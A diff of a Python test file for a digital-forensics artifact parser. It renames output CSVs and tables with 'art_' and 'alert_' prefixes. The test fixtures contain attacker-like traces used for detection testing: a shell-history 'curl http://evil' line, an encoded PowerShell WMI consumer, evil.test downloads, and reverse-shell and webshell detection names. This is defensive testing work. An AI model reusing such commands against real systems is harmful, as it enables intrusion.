@@ -59,7 +59,7 @@ def test_handler_bash_history(tmp_path):
     r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
 
     assert r.status == "ok"
-    out = (tmp_path / "CSVs" / "shell_history.csv").read_text(encoding="utf-8")
+    out = (tmp_path / "CSVs" / "art_shell_history.csv").read_text(encoding="utf-8")
     assert "1,alice,bash,,,ls" in out
     assert "2,alice,bash,,,whoami" in out
     assert "1,bob,bash,,,id" in out         # sequential id resets per user
@@ -108,15 +108,27 @@ def test_clean_output_names_with_short(tmp_path):
     srum.mkdir()
     (srum / "20260620211506_SrumECmd_NetworkUsages_Output.csv").write_text("a")
     (srum / "jdoe_UsrClass.csv").write_text("b")  # (SBECmd-style per-user file)
-    _clean_output_names(srum, before=set(), short="srum")
-    assert (srum / "srum_NetworkUsages.csv").is_file()        # tool prefix replaced
-    assert (srum / "srum_jdoe_UsrClass.csv").is_file()     # plain name prefixed
+    (srum / "20260620211506_SrumECmd_AppResourceUseInfo_Output.csv").write_text("c")
+    _clean_output_names(srum, before=set(), short="art_srum",
+                        subtypes={"AppResourceUseInfo": "app_resource_use"})
+    # tool prefix replaced, the subtype in snake_case (v0.7.171) or as `subtypes` names it
+    assert (srum / "art_srum_network_usages.csv").is_file()
+    assert (srum / "art_srum_app_resource_use.csv").is_file()
+    assert (srum / "art_srum_jdoe_usr_class.csv").is_file()       # plain name prefixed
 
     db = tmp_path / "deepblue"
     db.mkdir()
     (db / "DeepBlue-Security.csv").write_text("c")            # deepblue handler output
     _clean_output_names(db, before=set(), short="deepblue")
-    assert (db / "deepblue_Security.csv").is_file()
+    assert (db / "deepblue_security.csv").is_file()
+
+    # a tool that names its files after --csvf already carries the prefix
+    am = tmp_path / "amcache"
+    am.mkdir()
+    (am / "20260620231505_art_amcache_UnassociatedFileEntries.csv").write_text("d")
+    _clean_output_names(am, before=set(), short="art_amcache",
+                        subtypes={"UnassociatedFileEntries": "unassociated_files"})
+    assert (am / "art_amcache_unassociated_files.csv").is_file()
 
 
 def test_machine_info_handler_no_hives(tmp_path):
@@ -125,14 +137,14 @@ def test_machine_info_handler_no_hives(tmp_path):
     from artifact_engine.handlers import win_systeminfo
     out = tmp_path / "CSVs"
     win_systeminfo.run(_ctx(tmp_path, out))  # no hives: must not crash
-    data = json.loads((out / "machine_info.json").read_text(encoding="utf-8"))
+    data = json.loads((out / "art_machine_info.json").read_text(encoding="utf-8"))
     assert data["volume"] == "live"
 
 
 def test_report_includes_machine_info(tmp_path):
     from artifact_engine.core import report
     (tmp_path / "CSVs").mkdir()
-    (tmp_path / "CSVs" / "machine_info.json").write_text(
+    (tmp_path / "CSVs" / "art_machine_info.json").write_text(
         '{"machine_name":"HOST1","product_name":"Windows 10","build":"19045",'
         '"IPs":["10.0.0.5"],"users":{"alice":"S-1-5-21"}}',
         encoding="utf-8",
@@ -341,7 +353,7 @@ def test_cleanup_outputs_keeps_populated_jsons(tmp_path):
 
 def test_consolidate_includes_liveresponse_json(tmp_path):
     """LiveResponse json/ artifacts (and suspicious findings) land in .db/.xlsx
-    with an lr_ prefix, alongside the CSV tables."""
+    with an art_lr_ prefix (the findings as alert_lr), alongside the CSV tables."""
     import json
     import sqlite3
 
@@ -366,13 +378,13 @@ def test_consolidate_includes_liveresponse_json(tmp_path):
 
     con = sqlite3.connect(tmp_path / "host.db")
     tables = {r[0] for r in con.execute("select name from sqlite_master where type='table'")}
-    assert {"foo", "lr_processes", "lr_suspicious"} <= tables
-    assert "lr_empty" not in tables                            # empty array dropped
-    assert con.execute("select count(*) from lr_processes").fetchone()[0] == 2
+    assert {"foo", "art_lr_processes", "alert_lr"} <= tables
+    assert "art_lr_empty" not in tables                            # empty array dropped
+    assert con.execute("select count(*) from art_lr_processes").fetchone()[0] == 2
     # nested dict serialised to JSON text, not exploded into columns
-    cols = [d[1] for d in con.execute("PRAGMA table_info(lr_processes)")]
+    cols = [d[1] for d in con.execute("PRAGMA table_info(art_lr_processes)")]
     assert "Hash" in cols and "Hash.MD5" not in cols
-    sev = con.execute("select severity from lr_suspicious").fetchone()[0]
+    sev = con.execute("select severity from alert_lr").fetchone()[0]
     assert sev == "high"
     con.close()
     assert (tmp_path / "host.xlsx").is_file()
@@ -501,7 +513,7 @@ def test_handler_usn_noop_without_journal(tmp_path):
     (tmp_path / "$Extend").mkdir()
     out = tmp_path / "CSVs"
     win_usn.run(_ctx(tmp_path, out))
-    assert not (out / "usn.csv").exists()
+    assert not (out / "art_usn.csv").exists()
 
 
 def test_handler_timeline_noop_without_db(tmp_path):
@@ -536,7 +548,7 @@ def test_handler_hayabusa_skips_without_binary(tmp_path):
     except HandlerSkip:
         raised = True
     assert raised
-    assert not (tmp_path / "CSVs" / "hayabusa.csv").exists()
+    assert not (tmp_path / "CSVs" / "art_hayabusa.csv").exists()
 
 
 def test_handler_hayabusa_names_a_binary_that_is_not_executable(tmp_path):
@@ -685,7 +697,7 @@ def test_handler_hayabusa_an_error_line_beside_a_finished_view_is_not_a_failure(
 
     haya.run(_ctx(tmp_path, tmp_path / "CSVs"))
 
-    assert (tmp_path / "CSVs" / "hayabusa.csv").is_file()
+    assert (tmp_path / "CSVs" / "art_hayabusa.csv").is_file()
 
 
 def test_handler_hayabusa_runs_from_an_absolute_folder_with_a_relative_tools_dir(tmp_path,
@@ -855,13 +867,14 @@ def test_bundled_parsers_load():
 
     ids = {p.id for p in load_parsers(Config().parser_dirs)}
     assert {
-        "browser", "wmi_persistence", "wmi_ccm_rua", "pca", "wer", "search_index",
-        "lnk", "jumplists", "recyclebin", "sum", "recentfilecache", "usn", "timeline",
-        "shell_history", "users", "tasks", "authorized_keys",  # linux
-        "process_network", "logins", "machine_info",
-        "file_anomalies",  # linux live-response
-        "auth_log", "packages", "executable_hashes", "bodyfile",  # linux wave 2
-        "log_sigma",  # linux sigma detections
+        "art_browser", "art_wmi_persistence", "art_wmi_ccm_rua", "art_pca", "art_wer",
+        "art_search_index", "art_lnk", "art_jumplist", "art_recyclebin", "art_sum",
+        "art_recentfilecache", "art_usn", "art_win_timeline",
+        "art_shell_history", "art_users", "art_tasks_linux", "art_authorized_keys",  # linux
+        "art_process_network", "art_logins", "art_machine_info_linux",
+        "alert_file_anomalies",  # linux live-response
+        "art_log_auth", "art_packages", "art_executable_hashes", "art_bodyfile",  # linux wave 2
+        "alert_log_sigma",  # linux sigma detections
     } <= ids
     # renamed in v0.7.158 so the id is the table: the old ids are gone, and each
     # is retired by its successor, or its last table stays in every parsed case
@@ -904,7 +917,7 @@ def test_handler_pca(tmp_path):
     )
     out = tmp_path / "CSVs"
     win_pca.run(_ctx(tmp_path, out))
-    text = (out / "pca.csv").read_text(encoding="utf-8")
+    text = (out / "art_pca.csv").read_text(encoding="utf-8")
     # PCA writes the host's LOCAL time with no offset in the string, and it is a
     # verbatim passthrough -> the header must say `_local`, never bare or `_utc`
     assert text.splitlines()[0] == "executable_path,last_executed_local"
@@ -927,7 +940,7 @@ def test_handler_wer(tmp_path):
     )
     out = tmp_path / "CSVs"
     win_wer.run(_ctx(tmp_path, out))
-    text = (out / "wer.csv").read_text(encoding="utf-8")
+    text = (out / "art_wer.csv").read_text(encoding="utf-8")
     # FILETIME's epoch is 1601 UTC, so the rendered value is UTC -> `_utc` header
     assert text.splitlines()[0].startswith("report,event_type,event_time_utc,")
     assert "APPCRASH" in text
@@ -951,7 +964,7 @@ def test_handler_wmi_persistence(tmp_path):
     (repo / "OBJECTS.DATA").write_bytes(blob)
     out = tmp_path / "CSVs"
     win_wmi.persistence(_ctx(tmp_path, out))
-    text = (out / "wmi_persistence.csv").read_text(encoding="utf-8")
+    text = (out / "art_wmi_persistence.csv").read_text(encoding="utf-8")
     assert "Evil-EvilFlt" in text
     assert "CommandLineEventConsumer" in text
     assert "powershell.exe -enc QQBBQQ==" in text
@@ -975,7 +988,7 @@ def test_handler_wmi_ccm_rua_xml(tmp_path):
     (repo / "OBJECTS.DATA").write_bytes(blob)
     out = tmp_path / "CSVs"
     win_wmi.ccm_rua(_ctx(tmp_path, out))
-    text = (out / "wmi_ccm_rua.csv").read_text(encoding="utf-8")
+    text = (out / "art_wmi_ccm_rua.csv").read_text(encoding="utf-8")
     head = text.splitlines()[0]
     assert "last_used_time_utc" in head and "timestamp1_utc,timestamp2_utc" in head
     assert "evil.exe" in text
@@ -1004,19 +1017,19 @@ def _concurrent_probe(ctx):
     concurrently. Used to prove `short` only renames this parser's own files."""
     ctx.out.mkdir(parents=True, exist_ok=True)
     (ctx.out / "NetworkUsages.csv").write_text("a\n", encoding="utf-8")
-    (ctx.out.parent / "wmi_ccm_rua.csv").write_text("foreign\n", encoding="utf-8")
+    (ctx.out.parent / "art_wmi_ccm_rua.csv").write_text("foreign\n", encoding="utf-8")
 
 
 def test_short_isolation_no_cross_rename(tmp_path):
     out = tmp_path / "CSVs"
     out.mkdir()
-    p = ParserManifest(id="srumlike", handler=f"{__name__}:_concurrent_probe", short="srum")
+    p = ParserManifest(id="srumlike", handler=f"{__name__}:_concurrent_probe", short="art_srum")
     r = run_parser(p, _ctx(tmp_path, out))
     assert r.status == "ok"
     names = {f.name for f in out.glob("*.csv")}
-    assert "srum_NetworkUsages.csv" in names       # own output gets the short prefix
-    assert "wmi_ccm_rua.csv" in names              # foreign output left untouched
-    assert "srum_wmi_ccm_rua.csv" not in names     # the concurrency bug must not recur
+    assert "art_srum_network_usages.csv" in names      # own output gets the short prefix
+    assert "art_wmi_ccm_rua.csv" in names              # foreign output left untouched
+    assert "art_srum_art_wmi_ccm_rua.csv" not in names  # the concurrency bug must not recur
     assert not (out / ".work_srumlike").exists()   # private work dir cleaned up
 
 
@@ -1069,14 +1082,14 @@ def test_handler_browser_chromium(tmp_path):
     out = tmp_path / "CSVs"
     win_browser.run(_ctx(tmp_path, out))
 
-    hist = (out / "browser_history.csv").read_text(encoding="utf-8")
+    hist = (out / "art_browser_history.csv").read_text(encoding="utf-8")
     # timestamp columns are labelled _utc in the header (values are pure UTC, no
     # local offset) so an analyst never mistakes them for local time
     assert hist.splitlines()[0] == \
         "user,browser,profile,url,title,visit_count,last_visit_utc"
     # 13350000000000000 us since the 1601 WebKit epoch = 2024-01-17 21:20:00 UTC
     assert "alice,Chrome,Default,http://evil.test,Evil Site,3,2024-01-17 21:20:00" in hist
-    dl = (out / "browser_downloads.csv").read_text(encoding="utf-8")
+    dl = (out / "art_browser_downloads.csv").read_text(encoding="utf-8")
     assert dl.splitlines()[0] == \
         "user,browser,profile,target_path,source_url,bytes,start_time_utc,end_time_utc"
     assert "evil.exe" in dl and "http://evil.test/evil.exe" in dl
@@ -1115,7 +1128,7 @@ def test_handler_logins_last_and_failed(tmp_path):
     )
     out = tmp_path / "CSVs"
     lin_logins.run(_ctx(tmp_path, out))
-    text = (out / "logins.csv").read_text(encoding="utf-8")
+    text = (out / "art_logins.csv").read_text(encoding="utf-8")
     # no wtmp/btmp binary: the text renderings are the record
     assert ",Tue May 26 16:07,still logged in,ok,,root,pts/0,10.0.0.9,last," in text
     assert ",Tue May 26 12:46,12:51  (00:05),ok,,root,pts/1,10.0.0.9,last," in text  # "- " gone
@@ -1146,7 +1159,7 @@ def test_handler_logins_text_only_where_the_binary_gave_nothing(tmp_path):
                                + _utmp_record(2, "~", "reboot", "", 1699990000))
     out = tmp_path / "CSVs"
     lin_logins.run(_ctx(tmp_path, out))
-    with open(out / "logins.csv", encoding="utf-8", newline="") as fh:
+    with open(out / "art_logins.csv", encoding="utf-8", newline="") as fh:
         rows = [(r["source"], r["result"], r["type"], r["user"]) for r in csv.DictReader(fh)]
     assert rows == [("wtmp", "ok", "USER_PROCESS", "root"), ("wtmp", "", "BOOT_TIME", "reboot"),
                     ("lastb", "failed", "", "admin")]
@@ -1180,7 +1193,7 @@ def test_handler_process_network_netstat_without_ss_and_ps_lstart(tmp_path):
     out = tmp_path / "CSVs"
     lin_process_network.run(_ctx(tmp_path, out))
     import csv
-    with open(out / "process_network.csv", encoding="utf-8", newline="") as fh:
+    with open(out / "art_process_network.csv", encoding="utf-8", newline="") as fh:
         rows = list(csv.DictReader(fh))
     by = {(r["pid"], r["proto"]): r for r in rows}
     db = by[("1557", "tcp")]
@@ -1219,7 +1232,7 @@ def test_handler_machineinfo_hostnamectl_and_nis(tmp_path):
     )
     out = tmp_path / "CSVs"
     lin_machineinfo.run(_ctx(tmp_path, out))
-    info = json.loads((out / "machine_info.json").read_text(encoding="utf-8"))
+    info = json.loads((out / "art_machine_info.json").read_text(encoding="utf-8"))
     assert info["machine_name"] == "web01"
     assert info["product_name"] == "Ubuntu 24.04.4 LTS"
     assert info["IPs"] == ["203.0.113.204"]          # loopback + link-local dropped
@@ -1233,7 +1246,7 @@ def test_handler_anomalies(tmp_path):
     (lr / "system" / "getcap_-r.txt").write_text("/bin/ping cap_net_raw=ep\n", encoding="utf-8")
     out = tmp_path / "CSVs"
     lin_anomalies.run(_ctx(tmp_path, out))
-    text = (out / "file_anomalies.csv").read_text(encoding="utf-8")
+    text = (out / "alert_file_anomalies.csv").read_text(encoding="utf-8")
     assert "hidden_file,/tmp/.hidden," in text
     assert "file_capability,/bin/ping,cap_net_raw=ep" in text
 
@@ -1253,7 +1266,7 @@ def test_handler_auth_dispatch_by_proc(tmp_path):
     )
     out = tmp_path / "CSVs"
     lin_auth.run(_ctx(tmp_path, out))
-    rows = (out / "auth_log.csv").read_text(encoding="utf-8").splitlines()
+    rows = (out / "art_log_auth.csv").read_text(encoding="utf-8").splitlines()
     body = "\n".join(rows)
     assert sum(1 for r in rows if ",su," in r) == 1            # only the real su line
     assert "ssh_accepted,root,10.0.0.9,password port 55099" in body
@@ -1281,10 +1294,10 @@ def test_handler_packages_dpkg_and_verify(tmp_path):
     )
     out = tmp_path / "CSVs"
     lin_packages.run(_ctx(tmp_path, out))
-    pkgs = (out / "packages.csv").read_text(encoding="utf-8")
+    pkgs = (out / "art_packages.csv").read_text(encoding="utf-8")
     assert "nginx,1.24.0-1,amd64,dpkg," in pkgs
     assert "oldpkg" not in pkgs                          # 'rc' (not installed) excluded
-    ver = (out / "package_verify.csv").read_text(encoding="utf-8")
+    ver = (out / "art_package_verify.csv").read_text(encoding="utf-8")
     assert "dpkg,??5??????,c,/etc/nginx/nginx.conf" in ver
     assert "dpkg,missing,,/usr/bin/important" in ver
 
@@ -1298,7 +1311,7 @@ def test_handler_packages_rpm(tmp_path):
     )
     out = tmp_path / "CSVs"
     lin_packages.run(_ctx(tmp_path, out))
-    pkgs = (out / "packages.csv").read_text(encoding="utf-8")
+    pkgs = (out / "art_packages.csv").read_text(encoding="utf-8")
     assert "libfstrm0,0.6.1-150300.9.3.1,,rpm,2023-12-14 14:47:15" in pkgs
 
 
@@ -1310,7 +1323,7 @@ def test_handler_hashes_join(tmp_path):
     (he / "hash_executables.sha1").write_text("ccc  /bin/ls\n", encoding="utf-8")
     out = tmp_path / "CSVs"
     lin_hashes.run(_ctx(tmp_path, out))
-    text = (out / "executable_hashes.csv").read_text(encoding="utf-8")
+    text = (out / "art_executable_hashes.csv").read_text(encoding="utf-8")
     assert "/bin/ls,aaa,ccc" in text
     assert "/tmp/x,bbb," in text          # md5 only, sha1 blank
 
@@ -1326,7 +1339,7 @@ def test_handler_bodyfile_epoch_and_pipe(tmp_path):
     )
     out = tmp_path / "CSVs"
     lin_bodyfile.run(_ctx(tmp_path, out))
-    rows = (out / "bodyfile.csv").read_text(encoding="utf-8").splitlines()
+    rows = (out / "art_bodyfile.csv").read_text(encoding="utf-8").splitlines()
     assert rows[0] == "name,inode,mode,uid,gid,size,atime_utc,mtime_utc,ctime_utc,crtime_utc"
     assert "/var,9568257,drwxr-xr-x,0,0,4096,2026-05-26 13:02:29," in rows[1]
     assert any(r.startswith("/tmp/a|b|c.txt,") for r in rows[2:])   # '|' in name preserved
@@ -1356,7 +1369,7 @@ def test_bodyfile_times_are_converted_once_and_identically(tmp_path, monkeypatch
     real = lin_bodyfile._iso
     monkeypatch.setattr(lin_bodyfile, "_iso", lambda e: calls.append(e) or real(e))
     lin_bodyfile.run(_ctx(tmp_path, out))
-    with (out / "bodyfile.csv").open(encoding="utf-8", newline="") as fh:
+    with (out / "art_bodyfile.csv").open(encoding="utf-8", newline="") as fh:
         got = [r[6:] for r in list(csv.reader(fh))[1:]]
     assert got == [[real(x) for x in ln.split("|")[7:]] for ln in lines]
     assert len(calls) < 4 * len(lines)          # remembered, not recomputed
@@ -1378,7 +1391,7 @@ def test_handler_bash_multi_shell_and_histtimeformat(tmp_path):
         ": 1700000120:0;curl http://evil\nls\n", encoding="utf-8")
     out = tmp_path / "CSVs"
     lin_bash.run(_ctx(tmp_path, out))
-    text = (out / "shell_history.csv").read_text(encoding="utf-8")
+    text = (out / "art_shell_history.csv").read_text(encoding="utf-8")
     assert "bob,bash,2023-11-14 22:13:20,,whoami" in text
     assert "bob,bash,,,id" in text
     assert "bob,bash,2023-11-14 22:14:20,,uname -a" in text
@@ -1411,7 +1424,7 @@ def test_handler_gtfobins_history_abuse(tmp_path):
     out = tmp_path / "CSVs" / "Detections"
     lin_gtfobins.run(_ctx(tmp_path, out))
 
-    rows = list(_csv.DictReader((out / "gtfobins.csv").open(encoding="utf-8")))
+    rows = list(_csv.DictReader((out / "alert_gtfobins.csv").open(encoding="utf-8")))
     by_bin: dict[str, list] = {}
     for r in rows:
         by_bin.setdefault(r["binary"], []).append(r)
@@ -1441,7 +1454,7 @@ def test_handler_gtfobins_benign_history_writes_nothing(tmp_path):
         encoding="utf-8")
     out = tmp_path / "CSVs" / "Detections"
     lin_gtfobins.run(_ctx(tmp_path, out))
-    assert not (out / "gtfobins.csv").exists()   # 0-row policy: no clutter file
+    assert not (out / "alert_gtfobins.csv").exists()   # 0-row policy: no clutter file
 
 
 def test_handler_anomalies_suspicious_flag(tmp_path):
@@ -1451,7 +1464,7 @@ def test_handler_anomalies_suspicious_flag(tmp_path):
         "/tmp/.x\n/home/bob/.bashrc\n", encoding="utf-8")
     out = tmp_path / "CSVs"
     lin_anomalies.run(_ctx(tmp_path, out))
-    lines = (out / "file_anomalies.csv").read_text(encoding="utf-8").splitlines()
+    lines = (out / "alert_file_anomalies.csv").read_text(encoding="utf-8").splitlines()
     assert lines[0].endswith("suspicious")
     assert "hidden_file,/tmp/.x,,yes" in lines
     assert "hidden_file,/home/bob/.bashrc,," in lines
@@ -1476,7 +1489,7 @@ def test_handler_anomalies_leaves_out_container_storage_and_the_collectors_outpu
         "/home/jdoe/uac/uac-host-01/[root]/tmp/.x\n/tmp/.x\n", encoding="utf-8")
     out = tmp_path / "CSVs"
     lin_anomalies.run(_ctx(tmp_path, out))
-    with open(out / "file_anomalies.csv", encoding="utf-8", newline="") as fh:
+    with open(out / "alert_file_anomalies.csv", encoding="utf-8", newline="") as fh:
         rows = [(r["indicator"], r["path"], r["detail"].split(" ")[0], r["suspicious"])
                 for r in csv.DictReader(fh)]
     assert rows == [
@@ -1498,7 +1511,7 @@ def test_handler_auth_reads_gzip(tmp_path):
         fh.write("2026-05-01T00:00:00+02:00 h sshd[1]: Failed password for root from 1.2.3.4 port 22 ssh2\n")
     out = tmp_path / "CSVs"
     lin_auth.run(_ctx(tmp_path, out))
-    assert "ssh_failed,root,1.2.3.4,port 22" in (out / "auth_log.csv").read_text(encoding="utf-8")
+    assert "ssh_failed,root,1.2.3.4,port 22" in (out / "art_log_auth.csv").read_text(encoding="utf-8")
 
 
 def test_handler_machineinfo_enriched(tmp_path):
@@ -1518,7 +1531,7 @@ def test_handler_machineinfo_enriched(tmp_path):
     (tmp_path / "[root]" / "etc" / "timezone").write_text("Europe/Madrid\n", encoding="utf-8")
     out = tmp_path / "CSVs"
     lin_machineinfo.run(_ctx(tmp_path, out))
-    info = json.loads((out / "machine_info.json").read_text(encoding="utf-8"))
+    info = json.loads((out / "art_machine_info.json").read_text(encoding="utf-8"))
     assert info["timezone"] == "Europe/Madrid"
     assert info["cpu"] == "Intel Xeon Gold 5220R"
     assert info["cpu_count"] == "8"
@@ -1589,7 +1602,7 @@ def test_sigma_handler_detects_and_respects_service(tmp_path, monkeypatch):
         encoding="utf-8")
     out = tmp_path / "CSVs"
     lin_sigma.run(_ctx(tmp_path, out))
-    text = (out / "log_sigma.csv").read_text(encoding="utf-8")
+    text = (out / "alert_log_sigma.csv").read_text(encoding="utf-8")
     assert "high,Reverse shell via nc," in text
     assert "medium,SSH failed password," in text
     assert text.count("SSH failed password") == 1            # cron lookalike excluded by service
@@ -1615,7 +1628,7 @@ def test_sigma_repeats_of_one_match_are_one_row_with_count_and_span(tmp_path, mo
         encoding="utf-8")
     out = tmp_path / "CSVs"
     lin_sigma.run(_ctx(tmp_path, out))
-    with open(out / "log_sigma.csv", encoding="utf-8", newline="") as fh:
+    with open(out / "alert_log_sigma.csv", encoding="utf-8", newline="") as fh:
         rows = list(csv.DictReader(fh))
     assert [(r["timestamp"], r["last_timestamp"], r["count"], r["match"]) for r in rows] == [
         ("Nov 14 22:00:00", "Nov 14 22:10:00", "3",
@@ -1630,7 +1643,7 @@ def test_sigma_handler_no_logs_is_clean(tmp_path):
     (tmp_path / "[root]").mkdir()
     lin_sigma.run(_ctx(tmp_path, tmp_path / "CSVs"))          # no var/log -> must not raise
     # no detections -> no CSV (a header-only file is just clutter)
-    assert not (tmp_path / "CSVs" / "log_sigma.csv").exists()
+    assert not (tmp_path / "CSVs" / "alert_log_sigma.csv").exists()
 
 
 def test_write_csv_suppresses_empty(tmp_path):
@@ -1675,7 +1688,7 @@ def test_handler_yara_matches_and_prunes_collector(tmp_path):
     p = ParserManifest(id="yara", handler="artifact_engine.handlers.lin_yara:run")
     r = run_parser(p, ctx)
     assert r.status == "ok"
-    out = (tmp_path / "CSVs" / "yara.csv").read_text(encoding="utf-8")
+    out = (tmp_path / "CSVs" / "alert_yara.csv").read_text(encoding="utf-8")
     assert "webshell_php_input_to_exec,,tmp/evil.php" in out
     assert "revshell_dev_tcp,,tmp/drop.sh" in out
     assert "uac-3.1.0" not in out          # collector subtree pruned
@@ -1695,7 +1708,7 @@ def test_handler_webshells_detects_and_spares_benign(tmp_path):
                        handler="artifact_engine.handlers.lin_webshells:run")
     r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
     assert r.status == "ok"
-    out = (tmp_path / "CSVs" / "webshells.csv").read_text(encoding="utf-8")
+    out = (tmp_path / "CSVs" / "alert_webshells.csv").read_text(encoding="utf-8")
     assert "var/www/html/shell.php" in out and "input_to_exec" in out
     assert "htaccess_handler" in out                 # auto_prepend_file flagged
     # index.php uses base64_decode/system but NOT on a request superglobal -> spared
@@ -1708,7 +1721,7 @@ def test_handler_webshells_skips_without_web_root(tmp_path):
                        handler="artifact_engine.handlers.lin_webshells:run")
     r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
     assert r.status == "skipped"
-    assert not (tmp_path / "CSVs" / "webshells.csv").exists()
+    assert not (tmp_path / "CSVs" / "alert_webshells.csv").exists()
 
 
 def _utmp_record(ut_type, line, user, host, sec):
@@ -1732,7 +1745,7 @@ def test_handler_btmp_parses_failed_logins(tmp_path):
     p = ParserManifest(id="logins", handler="artifact_engine.handlers.lin_logins:run")
     r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
     assert r.status == "ok"
-    out = (tmp_path / "CSVs" / "logins.csv").read_text(encoding="utf-8")
+    out = (tmp_path / "CSVs" / "art_logins.csv").read_text(encoding="utf-8")
     assert "failed,LOGIN_PROCESS,root,ssh:notty,45.66.33.21,btmp,[root]" in out
     assert "failed,LOGIN_PROCESS,admin,ssh:notty,45.66.33.21,btmp,[root]" in out
     assert "2023-11-14" in out                       # timestamp decoded
@@ -1752,7 +1765,7 @@ def test_handler_anomalies_world_writable(tmp_path):
         "/var/www/html/uploads/2016\n", encoding="utf-8")  # webroot churn -> skipped
 
     lin_anomalies.run(_ctx(tmp_path, tmp_path / "CSVs"))
-    out = (tmp_path / "CSVs" / "file_anomalies.csv").read_text(encoding="utf-8")
+    out = (tmp_path / "CSVs" / "alert_file_anomalies.csv").read_text(encoding="utf-8")
     assert "world_writable_file,/var/www/html/shell.php,,yes" in out   # writable .php -> flagged
     assert "/tmp/sess.lock" not in out                 # expected temp skipped
     assert "photo.jpg" not in out                      # inert image skipped
@@ -1774,7 +1787,7 @@ def test_handler_kernel_modules_and_taint(tmp_path):
     (sysd / "core_pattern.txt").write_text("|/tmp/.x/collect %p\n", encoding="utf-8")
 
     lin_kernel.run(_ctx(tmp_path, tmp_path / "CSVs"))
-    out = (tmp_path / "CSVs" / "kernel_modules.csv").read_text(encoding="utf-8")
+    out = (tmp_path / "CSVs" / "art_kernel_modules.csv").read_text(encoding="utf-8")
     assert "taint,unsigned_module,bit 13,yes" in out          # rootkit-relevant -> flagged
     assert "taint,out_of_tree_module,bit 12," in out          # common -> listed, not flagged
     assert "taint,taint_value,12288 = out_of_tree_module + unsigned_module,yes" in out
@@ -1793,7 +1806,7 @@ def test_a_taint_with_no_module_bit_is_not_flagged_and_says_what_it_is(tmp_path)
     (sysd / "cat_proc_sys_kernel_tainted.txt").write_text(
         f"{(1 << 16) | (1 << 31)}\n", encoding="utf-8")
     lin_kernel.run(_ctx(tmp_path, tmp_path / "CSVs"))
-    out = (tmp_path / "CSVs" / "kernel_modules.csv").read_text(encoding="utf-8")
+    out = (tmp_path / "CSVs" / "art_kernel_modules.csv").read_text(encoding="utf-8")
     assert "taint,taint_value,2147549184 = aux_tainted + distro_bit_31," in out
     assert 'taint,distro_bit_31,"bit 31: not a kernel.org flag' in out
     assert ",yes" not in out
@@ -1808,7 +1821,7 @@ def test_an_out_of_tree_module_alone_still_flags_the_value(tmp_path):
     sysd.mkdir(parents=True)
     (sysd / "cat_proc_sys_kernel_tainted.txt").write_text("4097\n", encoding="utf-8")
     lin_kernel.run(_ctx(tmp_path, tmp_path / "CSVs"))
-    out = (tmp_path / "CSVs" / "kernel_modules.csv").read_text(encoding="utf-8")
+    out = (tmp_path / "CSVs" / "art_kernel_modules.csv").read_text(encoding="utf-8")
     assert "taint,taint_value,4097 = proprietary_module + out_of_tree_module,yes" in out
     assert "taint,out_of_tree_module,bit 12,\n" in out.replace("\r\n", "\n")
 
@@ -1820,7 +1833,7 @@ def test_handler_kernel_core_pattern_benign(tmp_path):
     (sysd / "core_pattern.txt").write_text(
         "|/usr/lib/systemd/systemd-coredump %P %u %g\n", encoding="utf-8")
     lin_kernel.run(_ctx(tmp_path, tmp_path / "CSVs"))
-    out = (tmp_path / "CSVs" / "kernel_modules.csv").read_text(encoding="utf-8")
+    out = (tmp_path / "CSVs" / "art_kernel_modules.csv").read_text(encoding="utf-8")
     assert "core_pattern,core_pattern,|/usr/lib/systemd/systemd-coredump %P %u %g," in out
     assert "systemd-coredump %P %u %g,yes" not in out          # standard handler not flagged
 
@@ -1841,7 +1854,7 @@ def test_handler_mdatp_health_threats_exclusions(tmp_path):
                        handler="artifact_engine.handlers.lin_mdatp:run")
     r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
     assert r.status == "ok"
-    out = (tmp_path / "CSVs" / "mdatp.csv").read_text(encoding="utf-8")
+    out = (tmp_path / "CSVs" / "art_mdatp.csv").read_text(encoding="utf-8")
     assert "health,healthy,false,yes" in out
     assert "health,real_time_protection_enabled,false,yes" in out
     assert "exclusion,,/tmp/.x,yes" in out
@@ -1855,7 +1868,7 @@ def test_handler_mdatp_skips_without_defender(tmp_path):
                        handler="artifact_engine.handlers.lin_mdatp:run")
     r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
     assert r.status == "skipped"
-    assert not (tmp_path / "CSVs" / "mdatp.csv").exists()
+    assert not (tmp_path / "CSVs" / "art_mdatp.csv").exists()
 
 
 def test_handler_services_and_timers(tmp_path):
@@ -1878,12 +1891,12 @@ def test_handler_services_and_timers(tmp_path):
         "2 timers listed.\n", encoding="utf-8")
 
     lin_services.run(_ctx(tmp_path, tmp_path / "CSVs"))
-    out = (tmp_path / "CSVs" / "services.csv").read_text(encoding="utf-8")
+    out = (tmp_path / "CSVs" / "art_services.csv").read_text(encoding="utf-8")
     assert "service,ssh.service,active/running,OpenBSD Secure Shell server," in out
     assert "service,logrotate.service,failed/failed,Rotate log files," in out   # surfaced, not flagged
     assert "service,old.service,inactive/dead,old.service,yes" in out           # not-found -> flagged
     assert "apt-daily.timer" not in out                                        # .timer in list-units ignored (only .service read there)
-    assert "logrotate.timer" not in out and "ua-timer" not in out             # timers: tasks.csv
+    assert "logrotate.timer" not in out and "ua-timer" not in out             # timers: art_tasks.csv
 
 
 def test_handler_ebpf_groups_and_pins(tmp_path):
@@ -1910,7 +1923,7 @@ def test_handler_ebpf_groups_and_pins(tmp_path):
                        handler="artifact_engine.handlers.lin_ebpf:run")
     r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
     assert r.status == "ok"
-    out = (tmp_path / "CSVs" / "ebpf.csv").read_text(encoding="utf-8")
+    out = (tmp_path / "CSVs" / "art_ebpf.csv").read_text(encoding="utf-8")
     assert "pin,implant_map,pinned object under /sys/fs/bpf (persists without loader),yes" in out
     assert "prog,kprobe,count=2 uid=0," in out                       # 2 root kprobes grouped
     assert "prog,kprobe,count=1 uid=465 loaded_by=perf-sensor," in out  # Sophos uid 465, not flagged
@@ -1925,7 +1938,7 @@ def test_handler_ebpf_skips_without_data(tmp_path):
                        handler="artifact_engine.handlers.lin_ebpf:run")
     r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
     assert r.status == "skipped"
-    assert not (tmp_path / "CSVs" / "ebpf.csv").exists()
+    assert not (tmp_path / "CSVs" / "art_ebpf.csv").exists()
 
 
 def test_handler_sessions_and_sockets(tmp_path):
